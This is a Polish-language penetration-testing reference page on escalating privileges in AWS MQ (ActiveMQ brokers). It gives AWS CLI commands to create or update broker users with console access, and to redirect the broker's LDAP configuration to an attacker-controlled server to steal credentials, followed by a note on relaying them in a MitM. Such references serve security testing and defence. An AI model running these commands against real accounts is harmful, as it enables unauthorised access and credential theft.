# AWS - MQ Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## MQ

Aby uzyskać więcej informacji o MQ, zobacz:

{{#ref}}
../../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

Dzięki tym uprawnieniom możesz **utworzyć nowego użytkownika w brokerze ActimeMQ** (to nie działa w RabbitMQ):
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Potencjalny wpływ:** Dostęp do wrażliwych informacji podczas nawigacji po ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

Dzięki tym uprawnieniom możesz **utworzyć nowego użytkownika w brokerze ActimeMQ** (to nie działa w RabbitMQ):
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Potential Impact:** Uzyskanie dostępu do poufnych informacji podczas nawigacji po ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

Jeśli broker używa **LDAP** do autoryzacji z **ActiveMQ**, możliwe jest **zmienienie** **konfiguracji** serwera LDAP na wskazanie **serwera kontrolowanego przez atakującego**. W ten sposób atakujący będzie w stanie **wykraść wszystkie poświadczenia przesyłane przez LDAP**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Jeśli w jakiś sposób znajdziesz oryginalne credentials używane przez ActiveMQ, możesz przeprowadzić MitM, ukraść creds, użyć ich na oryginalnym serwerze i przesłać odpowiedź (być może wystarczy po prostu ponownie użyć skradzionych credentials).

**Potencjalny wpływ:** Ukradzenie credentials ActiveMQ

{{#include ../../../../banners/hacktricks-training.md}}
